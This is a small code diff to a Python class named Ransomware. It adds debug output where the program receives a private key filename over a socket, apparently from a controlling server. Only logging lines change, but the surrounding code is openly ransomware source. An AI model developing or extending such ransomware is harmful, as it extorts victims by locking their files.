@@ -334,7 +334,9 @@ class Ransomware:
             
                 """ Receiving the private key. """
                 filename = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
-                print(f"[RECV] Receiving the private key.")
+                print(f"[RECV] Receiving the private key")
+                print("filename: " + filename)
+
                 key = open(filename, "w")
                 self._socket.sendall("Private key filename received.".encode("utf-8"))
     
